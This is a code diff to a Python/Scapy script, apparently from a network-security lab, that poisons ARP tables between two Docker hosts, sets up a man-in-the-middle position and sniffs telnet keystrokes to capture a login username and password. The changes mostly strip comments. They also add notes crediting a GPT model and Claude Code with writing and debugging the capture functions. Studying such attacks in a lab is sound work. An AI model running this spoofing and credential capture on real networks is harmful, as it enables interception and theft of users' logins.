@@ -36,7 +36,7 @@ def mitm():
     poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
     
 
-def is_telnet_traffic(pckt):
+def is_telnet_traffic(pckt): #GPT Generated Helper Function
     return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == hostB_IP or pckt[IP].src == hostB_IP)
 
 def is_client_keystroke(pckt):
@@ -65,27 +65,21 @@ last_client_seq = 0
 
 
 
-def print_pckt(pckt):
+def print_pckt(pckt): #LLM (Claude Code) Aided Debug in Function
 
     global username, password, return_cnt, credentials_captured, last_client_seq
 
-    # Forward the packet first to keep connection alive
-    #forward_packet(pckt)
-
-    # Only process keystrokes from client (Host A) to server (Host B)
 
     if not is_client_keystroke(pckt) or credentials_captured:
         return
     if pckt.haslayer(TCP) and pckt[TCP].seq == last_client_seq:
         return
-    # If it's a new packet, update our tracker and continue.
 
     if pckt.haslayer(TCP):
         last_client_seq = pckt[TCP].seq
 
     if pckt.haslayer(Raw):
         byte_data = pckt[Raw].load
-        # Check for various carriage return patterns
         if byte_data in [b'\r\x00', b'\r', b'\n', b'\r\n']:
             return_cnt += 1
         elif not byte_data.startswith(b'\xff'):
@@ -105,22 +99,18 @@ def print_pckt(pckt):
 
 
 if __name__ == "__main__":
-    # Step 1: Create initial ARP entry by spoofing ping from random IP to Host A
     print("Step 1: Creating initial ARP entry...")
     spoof(random_IP, hostA_IP)
     time.sleep(1)
     
-    # Step 2: Poison Host A's ARP table to map random IP to attacker MAC
     print("Step 2: Poisoning Host A's ARP table...")
     poison_arp(random_IP, attacker_MAC, hostA_IP, hostA_MAC)
     time.sleep(1)
     input("Paused after poisoning Host A. Run `docker exec -it hostA-10.9.0.5 arp -n` in another terminal to verify the entry. Press ENTER here to continue...")
 
 
-    # Step 3: Perform full MiTM attack between Host A and Host B
     print("Step 3: Performing MiTM attack...")
     mitm()
     
-    # Step 4: Start sniffing telnet traffic
     print("Step 4: Sniffing telnet traffic...")
     sniff(iface=interface, lfilter=is_telnet_traffic, prn=print_pckt)
